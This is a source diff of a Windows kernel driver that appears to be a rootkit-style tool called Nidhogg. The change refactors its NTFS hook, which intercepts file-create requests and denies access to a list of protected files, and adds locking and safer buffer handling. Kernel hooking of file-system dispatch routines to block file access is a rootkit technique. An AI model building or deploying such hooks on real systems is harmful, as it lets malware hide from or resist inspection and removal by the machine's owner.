@@ -1,8 +1,10 @@
 #include "pch.h"
 #include "FileUtils.hpp"
+#include "MemoryAllocator.hpp"
 
 FileUtils::FileUtils() {
 	this->Files.FilesCount = 0;
+	this->Files.LastIndex = 0;
 
 	for (int i = 0; i < SUPPORTED_HOOKED_NTFS_CALLBACKS; i++)
 		this->Callbacks[i].Activated = false;
@@ -13,11 +15,14 @@ FileUtils::FileUtils() {
 FileUtils::~FileUtils() {
 	AutoLock locker(this->Lock);
 
-	for (ULONG i = 0; i < this->Files.FilesCount; i++) {
-		ExFreePoolWithTag(this->Files.FilesPath[i], DRIVER_TAG);
-		this->Files.FilesPath[i] = nullptr;
-		this->Files.FilesCount--;
+	for (ULONG i = 0; i <= this->Files.LastIndex; i++) {
+		if (this->Files.FilesPath[i]) {
+			ExFreePoolWithTag(this->Files.FilesPath[i], DRIVER_TAG);
+			this->Files.FilesPath[i] = nullptr;
+		}
 	}
+	this->Files.FilesCount = 0;
+	this->Files.LastIndex = 0;
 
 	// Uninstalling NTFS hooks if there are any.
 	if (this->Callbacks[0].Activated)
@@ -36,23 +41,37 @@ FileUtils::~FileUtils() {
 * @status		[NTSTATUS]		 -- Whether the operation was successful or not.
 */
 NTSTATUS HookedNtfsIrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
-	WCHAR fullPath[MAX_PATH + 1] = DEFAULT_DRIVE_LETTER;
 	auto stack = IoGetCurrentIrpStackLocation(Irp);
+	WCHAR* fullPath = NULL;
 
-	if (!stack || !stack->FileObject)
-		return ((tNtfsIrpFunction)NidhoggFileUtils->GetNtfsCallback(0).Address)(DeviceObject, Irp);
+	do {
+		if (!stack || !stack->FileObject)
+			break;
 
-	if (stack->FileObject->FileName.Length == 0)
-		return ((tNtfsIrpFunction)NidhoggFileUtils->GetNtfsCallback(0).Address)(DeviceObject, Irp);
+		if (stack->FileObject->FileName.Length == 0)
+			break;
 
-	wcscat(fullPath, stack->FileObject->FileName.Buffer);
+		SIZE_T fullPathSize = (((SIZE_T)stack->FileObject->FileName.Length + 1) * sizeof(WCHAR) + sizeof(DEFAULT_DRIVE_LETTER));
+		MemoryAllocator<WCHAR*> fullPathAlloc(fullPath, fullPathSize, PagedPool);
 
-	AutoLock locker(NidhoggFileUtils->GetFileLock());
+		if (!fullPath)
+			break;
 
-	if (NidhoggFileUtils->FindFile(fullPath)) {
-		Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
-		return STATUS_SUCCESS;
-	}
+		errno_t err = wcscpy_s(fullPath, sizeof(DEFAULT_DRIVE_LETTER), DEFAULT_DRIVE_LETTER);
+
+		if (err != 0)
+			break;
+
+		err = wcscat_s(fullPath, stack->FileObject->FileName.Length * sizeof(WCHAR), stack->FileObject->FileName.Buffer);
+
+		if (err != 0)
+			break;
+
+		if (NidhoggFileUtils->FindFile(fullPath)) {
+			Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
+			return STATUS_SUCCESS;
+		}
+	} while (false);
 
 	return ((tNtfsIrpFunction)NidhoggFileUtils->GetNtfsCallback(0).Address)(DeviceObject, Irp);
 }
@@ -145,9 +164,14 @@ NTSTATUS FileUtils::UninstallNtfsHook(int irpMjFunction) {
 * @status [bool]   -- Whether found or not.
 */
 bool FileUtils::FindFile(WCHAR* path) {
-	for (ULONG i = 0; i < this->Files.FilesCount; i++)
-		if (_wcsicmp(this->Files.FilesPath[i], path) == 0)
-			return true;
+	AutoLock locker(this->Lock);
+
+	for (ULONG i = 0; i <= this->Files.LastIndex; i++) {
+		if (this->Files.FilesPath[i]) {
+			if (_wcsicmp(this->Files.FilesPath[i], path) == 0)
+				return true;
+		}
+	}
 	return false;
 }
 
@@ -162,17 +186,27 @@ bool FileUtils::FindFile(WCHAR* path) {
 * @status [bool]   -- Whether successfully added or not.
 */
 bool FileUtils::AddFile(WCHAR* path) {
+	AutoLock locker(this->Lock);
+
 	for (int i = 0; i < MAX_FILES; i++)
 		if (this->Files.FilesPath[i] == nullptr) {
-			auto len = (wcslen(path) + 1) * sizeof(WCHAR);
-			auto buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, len, DRIVER_TAG);
+			SIZE_T len = (wcslen(path) + 1) * sizeof(WCHAR);
+			WCHAR* buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, len, DRIVER_TAG);
 
 			// Not enough resources.
 			if (!buffer) {
 				break;
 			}
+			errno_t err = wcscpy_s(buffer, len / sizeof(WCHAR), path);
+			
+			if (err != 0) {
+				ExFreePoolWithTag(buffer, DRIVER_TAG);
+				break;
+			}
 
-			wcscpy_s(buffer, len / sizeof(WCHAR), path);
+			if (i > this->Files.LastIndex)
+				this->Files.LastIndex = i;
+
 			this->Files.FilesPath[i] = buffer;
 			this->Files.FilesCount++;
 			return true;
@@ -191,24 +225,38 @@ bool FileUtils::AddFile(WCHAR* path) {
 * @status [bool]   -- Whether successfully removed or not.
 */
 bool FileUtils::RemoveFile(WCHAR* path) {
-	for (ULONG i = 0; i < this->Files.FilesCount; i++)
-		if (_wcsicmp(this->Files.FilesPath[i], path) == 0) {
-			ExFreePoolWithTag(this->Files.FilesPath[i], DRIVER_TAG);
-			this->Files.FilesPath[i] = nullptr;
-			this->Files.FilesCount--;
-			return true;
+	ULONG newLastIndex = 0;
+	AutoLock locker(this->Lock);
+
+	for (ULONG i = 0; i <= this->Files.LastIndex; i++) {
+		if (this->Files.FilesPath[i]) {
+			if (_wcsicmp(this->Files.FilesPath[i], path) == 0) {
+				ExFreePoolWithTag(this->Files.FilesPath[i], DRIVER_TAG);
+
+				if (i == this->Files.LastIndex)
+					this->Files.LastIndex = newLastIndex;
+				this->Files.FilesPath[i] = nullptr;
+				this->Files.FilesCount--;
+				return true;
+			}
+			else
+				newLastIndex = i;
 		}
+	}
 	return false;
 }
 
 void FileUtils::ClearFilesList() {
-	AutoLock locker(this->GetFileLock());
+	AutoLock locker(this->Lock);
 
-	for (ULONG i = 0; i < this->Files.FilesCount; i++) {
-		ExFreePoolWithTag(this->Files.FilesPath[i], DRIVER_TAG);
-		this->Files.FilesPath[i] = nullptr;
+	for (ULONG i = 0; i <= this->Files.LastIndex; i++) {
+		if (this->Files.FilesPath[i]) {
+			ExFreePoolWithTag(this->Files.FilesPath[i], DRIVER_TAG);
+			this->Files.FilesPath[i] = nullptr;
+		}
 	}
 
+	this->Files.LastIndex = 0;
 	this->Files.FilesCount = 0;
 }
 
